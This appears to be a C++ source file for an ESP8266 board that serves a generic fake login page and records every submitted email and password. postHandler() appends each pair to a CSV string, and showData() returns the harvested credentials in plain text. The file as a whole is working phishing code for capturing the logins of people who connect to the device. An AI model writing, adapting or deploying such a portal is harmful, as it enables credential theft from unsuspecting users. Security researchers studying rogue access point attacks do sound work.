#include "../include/webpage.hpp"

Webpage::Webpage(ESP8266WebServer *server) : server(server), data("id,email,pass\n"), id(0) {}

void Webpage::index()
{
    constexpr auto inx =
#if USE_FS
        "/index.html";
#else
        R"(<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title></title><link rel="stylesheet" href="./style.css"></head><body><div id="bg"></div><div class="form-field"><form action="/post" method="post"><input type="email" placeholder="Email / Username" name="email"><br><input type="password" placeholder="Password" name="pass"><br><button class="btn" type="submit">Log in</button><br></form></div></body></html>)";
#endif

    loadFile(inx);
}

void Webpage::admin() { index(); }

void Webpage::style()
{

    constexpr auto inx =
#if USE_FS
        "/style.css";
#else
        R"(@import url("https://fonts.googleapis.com/css?family=Lato:400,700");#bg{background-image: url("/background.jpg");position: fixed;left: 0;top: 0;width: 100%;height: 100%;background-size: cover;filter: blur(5px)}body{font-family: "Lato", sans-serif;color: #4a4a4a;display: flex;justify-content: center;align-items: center;min-height: 100vh;overflow: hidden;margin: 0;padding: 0}form{width: 350px;position: relative}form .form-field::before{font-size: 20px;position: absolute;left: 15px;top: 17px;color: #888888;content: " ";display: block;background-size: cover;background-repeat: no-repeat}form .form-field:nth-child(1)::before{background-image: url(img/user-icon.png);width: 20px;height: 20px;top: 15px}form .form-field:nth-child(2)::before{background-image: url(img/lock-icon.png);width: 16px;height: 16px}form .form-field{display: -webkit-box;display: -ms-flexbox;display: flex;-webkit-box-pack: justify;-ms-flex-pack: justify;justify-content: space-between;-webkit-box-align: center;-ms-flex-align: center;align-items: center;margin-bottom: 1rem;position: relative}form input{font-family: inherit;width: 100%;outline: none;background-color: #fff;border-radius: 4px;border: none;display: block;padding: 0.9rem 0.7rem;box-shadow: 0px 3px 6px rgba(0, 0, 0, 0.16);font-size: 17px;color: #4a4a4a;text-indent: 40px}form .btn{outline: none;border: none;cursor: pointer;display: inline-block;margin: 0 auto;padding: 0.9rem 2.5rem;text-align: center;background-color: #47ab11;color: #fff;border-radius: 4px;box-shadow: 0px 3px 6px rgba(0, 0, 0, 0.16);font-size: 17px})";
#endif
    loadFile(inx, HTTP_CSS);
}

void Webpage::script()
{

    constexpr auto inx = R"()";
    loadFile(inx, HTTP_APP_JS);
}

void Webpage::background()
{

    auto inx =
#if USE_FS
        "/background.jpg";
#else
        /* Base64 image */
        R"()";
#endif
    loadFile(inx, HTTP_IMG_JPG);
}

void Webpage::postHandler()
{
    data += String(++id) + ",";
    data += input("email") + ",";
    data += input("pass") + "\n";

    index();
}

void Webpage::showData() { loadFile(data.c_str(), HTTP_PLAIN); }

String Webpage::input(String arg)
{
    String a = server->arg(arg);
    a.replace("<", "&lt;");
    a.replace(">", "&gt;");
    a.substring(0, 200);
    return a;
}

void Webpage::loadFile(const char *file, const char *content_type)
{
#if USE_FS
    if (!LittleFS.begin()) {
        server->send(500, "text/plain", "Could not init FS!");
        return;
    }

    File f = LittleFS.open(file, "r");
    if (!f) {
        server->send(500, "text/plain", "Problem with opening file!\n");
        return;
    }

    server->streamFile(f, content_type);
    f.close();
#else
    server->send(HTTP_SUCCESS, content_type, file);
#endif
}
